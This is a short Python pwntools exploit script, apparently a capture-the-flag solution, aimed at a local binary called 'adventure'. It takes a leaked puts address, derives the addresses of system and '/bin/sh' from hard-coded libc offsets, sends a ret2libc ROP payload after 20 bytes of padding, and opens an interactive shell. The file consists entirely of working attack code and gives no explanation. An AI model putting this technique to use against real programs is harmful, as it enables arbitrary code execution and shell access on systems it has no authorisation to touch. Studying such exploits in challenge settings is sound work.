from pwn import *

io = process("./adventure")
#io = gdb.debug("./adventure", 
#'''
#break *0x0000000000401402
#continue
#''')
context.log_level = 'debug' 

diff = 0x7ffff7e14ed0 - 0x7ffff7de4d60
diff2 = 1406920

io.recvuntil("game: 2\n")
io.sendline('2')
b = io.recvline().decode()

puts = b[-15:]
puts = puts[:-1]
puts = int(puts, 16)

system = puts - diff
binsh = puts + diff2

io.recvuntil("Choice :\n")

print(hex(puts))
print(hex(system))
print(hex(binsh))

payload = b'a' * 20
payload += p64(0x00000000004011e6)
payload += p64(binsh)
payload += p64(0x0)
payload += p64(system)
payload += p64(0x0)
io.sendline(payload)
io.interactive()
